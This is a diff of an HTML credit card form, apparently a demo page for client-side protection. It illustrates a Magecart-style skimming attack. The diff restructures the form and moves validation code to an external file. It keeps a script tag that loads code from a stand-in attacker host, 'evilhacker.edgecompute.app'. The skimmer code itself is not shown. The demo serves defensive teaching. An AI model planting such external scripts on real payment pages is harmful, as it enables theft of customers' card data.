@@ -5,22 +5,21 @@
     <link rel="stylesheet" href="/static-assets/client-side-protection-demo.css">
 </head>
 <body>
-    <div class="warning">
+    <div class="form-container">
+      <div class="warning">
         <strong>Magecart Demo:</strong> This is a simplified demonstration of a Magecart-style attack.  In a real attack, the malicious script would be injected more subtly (e.g., through a compromised third-party library, supply chain attack, or XSS vulnerability).  Do not enter real credit card information.
       </div>
-    <div class="form-container">
-      
       <form action="/anything/post" method="POST" id="credit-card-form">
           <label for="card-number">Card Number:</label>
-          <input type="text" id="card-number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" required="">
+          <input type="text" id="card-number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" required>
           <div class="error" id="card-number-error"></div>
 
 
           <div class="expiry-cvv-container">
               <div class="expiry-container">
                   <label for="expiry-month">Expiry Date:</label>
-                  <select id="expiry-month" name="expiry_month" required="">
-                      <option value="" disabled="" selected="">MM</option>
+                  <select id="expiry-month" name="expiry_month" required>
+                      <option value="" disabled selected>MM</option>
                       <option value="01">01</option>
                       <option value="02">02</option>
                       <option value="03">03</option>
@@ -34,29 +33,21 @@
                       <option value="11">11</option>
                       <option value="12">12</option>
                   </select>
-                  <select id="expiry-year" name="expiry_year" required="">
-                    <option value="" disabled="" selected="">YY</option>
-                      <script>
-                          const currentYear = new Date().getFullYear() % 100;
-                          for (let i = 0; i < 10; i++) {
-                              const year = currentYear + i;
-                              const yearStr = String(year).padStart(2, '0');
-                              document.write(`<option value="${yearStr}">${yearStr}</option>`);
-                          }
-                      </script>
-                  </select>
+                  <select id="expiry-year" name="expiry_year" required>
+                    <option value="" disabled selected>YY</option>
+                      </select>
                   <div class="error" id="expiry-date-error"></div>
               </div>
 
               <div class="cvv-container">
                   <label for="cvv">CVV:</label>
-                  <input type="text" id="cvv" name="cvv" placeholder="XXX" maxlength="4" required="" pattern="[0-9]{3,4}">
+                  <input type="text" id="cvv" name="cvv" placeholder="XXX" maxlength="4" required pattern="[0-9]{3,4}">
                   <div class="error" id="cvv-error"></div>
               </div>
           </div>
 
           <label for="cardholder-name">Cardholder Name:</label>
-          <input type="text" id="cardholder-name" name="cardholder_name" placeholder="John Doe" required="">
+          <input type="text" id="cardholder-name" name="cardholder_name" placeholder="John Doe" required>
           <div class="error" id="cardholder-name-error"></div>
 
           <button type="submit">Submit Payment</button>
@@ -64,87 +55,7 @@
   </div>
 
     <script src="https://evilhacker.edgecompute.app/static-assets/evilhacker.js"></script>
+    <script src="/static-assets/client-side-protection-demo.js"></script>
 
-    <script>
-        const form = document.getElementById('credit-card-form');
-        const cardNumberInput = document.getElementById('card-number');
-        const expiryMonthInput = document.getElementById('expiry-month');
-        const expiryYearInput = document.getElementById('expiry-year');
-        const cvvInput = document.getElementById('cvv');
-        const cardholderNameInput = document.getElementById('cardholder-name');
-
-        const cardNumberError = document.getElementById('card-number-error');
-        const expiryDateError = document.getElementById('expiry-date-error');
-        const cvvError = document.getElementById('cvv-error');
-        const cardholderNameError = document.getElementById('cardholder-name-error');
-
-        form.addEventListener('submit', (event) => {
-            let isValid = true;
-
-            // Clear previous errors
-            cardNumberError.textContent = '';
-            expiryDateError.textContent = '';
-            cvvError.textContent = '';
-            cardholderNameError.textContent = '';
-
-            // Card Number Validation (Basic)
-            const cardNumber = cardNumberInput.value.replace(/\s/g, ''); // Remove spaces
-             if (!/^\d{13,19}$/.test(cardNumber)) {
-                cardNumberError.textContent = 'Invalid card number';
-                isValid = false;
-             }
-
-            // Expiry Date Validation
-            const expiryMonth = expiryMonthInput.value;
-            const expiryYear = expiryYearInput.value;
-            const currentYear = new Date().getFullYear() % 100;
-            const currentMonth = new Date().getMonth() + 1;
-
-              if (!expiryMonth || !expiryYear)
-              {
-                  expiryDateError.textContent = "Please select month and year";
-                  isValid = false;
-              }
-               else if (parseInt(expiryYear) < currentYear || (parseInt(expiryYear) === currentYear && parseInt(expiryMonth) < currentMonth)) {
-                expiryDateError.textContent = 'Card has expired';
-                isValid = false;
-            }
-
-
-            // CVV Validation
-            const cvv = cvvInput.value;
-            if (!/^[0-9]{3,4}$/.test(cvv)) {
-                cvvError.textContent = 'Invalid CVV';
-                isValid = false;
-            }
-
-            // Cardholder Name Validation (Basic)
-            const cardholderName = cardholderNameInput.value.trim();
-             if (cardholderName === '') {
-               cardholderNameError.textContent = 'Cardholder name is required';
-               isValid = false;
-             }
-
-            if (!isValid) {
-                event.preventDefault();
-            }
-        });
-
-        cardNumberInput.addEventListener('input', (event) => {
-          let value = event.target.value.replace(/\D/g, '');
-          let formattedValue = '';
-          for (let i = 0; i < value.length; i++) {
-            if (i > 0 && i % 4 === 0) {
-              formattedValue += ' ';
-            }
-            formattedValue += value[i];
-          }
-            event.target.value = formattedValue;
-        });
-
-        cvvInput.addEventListener('input', (event) => {
-            event.target.value = event.target.value.replace(/\D/g, '');
-        });
-    </script>
-
-</body></html>
+</body>
+</html>
